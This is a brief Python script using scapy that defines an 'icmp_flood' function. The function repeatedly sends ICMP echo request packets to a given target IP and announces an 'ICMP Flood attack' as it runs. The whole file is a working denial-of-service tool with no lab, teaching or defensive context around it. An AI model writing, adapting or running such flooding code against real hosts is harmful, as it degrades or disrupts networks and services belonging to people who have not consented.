from scapy.all import *
import time

def icmp_flood(target_ip,packet_count=100):
	print(f"[+]Starting icmp Flood attack on {target_ip} with {packet_count} packets....")

	packet=IP(dst=target_ip)/ICMP()

	for i in range(packet_count):
		send(packet,verbose=0)
		print(f"[{i+1}] Sent ICMP Echo Request")
		time.sleep(0.01)

	print("[+] ICMP Flood complete")


